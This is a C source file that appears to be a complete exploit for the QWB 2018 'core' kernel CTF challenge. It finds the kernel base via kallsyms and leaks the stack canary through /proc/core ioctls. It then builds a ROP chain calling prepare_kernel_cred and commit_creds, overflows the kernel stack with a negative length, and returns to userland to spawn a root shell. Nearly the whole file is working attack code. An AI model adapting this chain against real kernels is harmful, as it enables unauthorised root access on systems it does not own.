/*************************************************************
 * File Name: exp_rop.c
 * 
 * Created on: 2019-10-08 05:35:38
 * Author: raycp
 * 
 * Last Modified: 2019-10-10 01:25:32
 * Description: rop exp for core
************************************************************/

#include<stdio.h>
#include<string.h>
#include<inttypes.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

/*
In [1]: from pwn import *

In [2]: e=ELF("./vmlinux")
[*] '/home/raycp/work/kernel/qwb2018-core/vmlinux'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0xffffffff81000000)
    RWX:      Has RWX segments

In [3]: hex(e.symbols['prepare_kernel_cred']-0xffffffff81000000)
Out[3]: '0x9cce0'
*/
uint64_t commit_creds = 0;
uint64_t prepare_kernel_cred = 0;
uint64_t commit_creds_offset = 0x9c8e0;
uint64_t prepare_kernel_cred_offset = 0x9cce0;
uint64_t kernel_base = 0;

uint64_t prdi_ret = 0x0b2f; //: pop rdi; ret;
uint64_t mov_rdi_rax_jmp_rcx = 0x1ae978; //: mov rdi, rax; jmp rcx;
uint64_t mov_rdi_rax_jmp_rdx = 0x6a6d2; //: mov rdi, rax; jmp rdx;
uint64_t prcx_ret = 0x21e53; //: pop rcx; ret;
uint64_t swapgs_p_ret = 0xa012da; //: swapgs; popfq; ret;
uint64_t iretq_ret = 0x50ac2; //: iretq; ret;


size_t user_cs, user_ss, user_rflags, user_sp;
uint64_t canary = 0;
uint64_t rbp = 0;


void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void save_status() {
    asm(
            "movq %%cs, %0\n\t"
            "movq %%ss, %1\n\t"
            "movq %%rsp, %2\n\t"
            "pushfq\n\t"
            "popq %3\n\t"
            : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) 
            : 
            : "memory");
            
 }

/*
void save_status()
{
    
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
            
}
*/

bool get_kernel_base()
{
    FILE *fp;
    uint64_t kernel_base1=0, kernel_base2=0;
    char line[0x30];

    fp = fopen("/tmp/kallsyms", "rb");

    if( fp < 0 ){
        die("open kallsyms failed");
    }

    while(fgets(line, 0x30, fp)){

        if(kernel_base != 0)
            return true;
        
        if(strstr(line, "commit_creds") && !commit_creds) {

            sscanf(line, "%llx", &commit_creds);
            printf("commit creds addr: %p\n", commit_creds);
            kernel_base1 = commit_creds - commit_creds_offset;
        }


        if(strstr(line, "prepare_kernel_cred") && !prepare_kernel_cred) {

            sscanf(line, "%llx", &prepare_kernel_cred);
            printf("prepare kernel cred addr: %p\n", prepare_kernel_cred);
            kernel_base2 = prepare_kernel_cred - prepare_kernel_cred_offset;
        }

        if (kernel_base1 !=0 && kernel_base1 == kernel_base2){
            kernel_base = kernel_base1;
        }


    }
    if (kernel_base == 0 )
        return false;
}
 
void set_gadget_addr()
{

    prdi_ret += kernel_base;
    prcx_ret += kernel_base;
    mov_rdi_rax_jmp_rcx += kernel_base;
    mov_rdi_rax_jmp_rdx += kernel_base;
    swapgs_p_ret += kernel_base;
    iretq_ret += kernel_base;

    return ;
}

void set_offset(int fd, int offset)
{
    ioctl(fd, 0x6677889C, offset);
}

void core_read(int fd, void *out_buffer, int offset)
{
    set_offset(fd, offset);
    ioctl(fd, 0x6677889B, out_buffer);

}

void core_write(int fd, void *buffer, uint32_t len)
{

    write(fd, buffer, len);

    return ;
}

void core_copy_func(int fd, uint32_t len)
{
    uint64_t nagtive_len = 0xffffffff00000000;
    
    nagtive_len |= len;
    ioctl(fd, 0x6677889A, nagtive_len);

    return ;
}

void leak_canary(int fd)
{
    uint8_t buffer[0x40];

    core_read(fd, buffer, 0x40);

    canary = *(uint64_t *)buffer;

    rbp = *(uint64_t *) (buffer+8);

    return ;
}

void root_shell()
{
    if(!getuid()) {
        system("/bin/sh");
    }
    else {
        die("get root shell failed");
    }
    exit(0);
}


int main()
{
    int fd, i=0;
    bool ret;
    uint8_t buffer[0x800] = {0};
    uint64_t *ptr;

    // step1 get kernel base and set all the gadget addr.
    ret = get_kernel_base();
    if (!ret)
        die("get kernel base error");
    printf("kernel base: %p\n", kernel_base);
    set_gadget_addr();

    
    fd = open("/proc/core", O_RDWR);

    // step2 leak canary
    leak_canary(fd);
    printf("leak canary: %p\n", canary);
   
    // step3 save register for the need of back to userland
	save_status();

    // step4 prepare the rop chain.
    ptr = (uint64_t *)(buffer+0x40);
    *(ptr + i++) = canary;
    *(ptr + i++) = rbp;
    *(ptr + i++) = prdi_ret;
    *(ptr + i++) = 0;
    *(ptr + i++) = prepare_kernel_cred;
    *(ptr + i++) = prcx_ret;
    *(ptr + i++) = commit_creds;
    *(ptr + i++) = mov_rdi_rax_jmp_rcx;
    *(ptr + i++) = swapgs_p_ret;
    *(ptr + i++) = 0;
    *(ptr + i++) = iretq_ret;
    *(ptr + i++) = (uint64_t) root_shell;
    *(ptr + i++) = user_cs;
    *(ptr + i++) = user_rflags;
    *(ptr + i++) = user_sp;
    *(ptr + i++) = user_ss;
    
    // step5 write rop data and trigger the stack overflow.
    core_write(fd, buffer, 0x800);
    
    printf("get root shell...\n");
    core_copy_func(fd, 0x100);
    
}

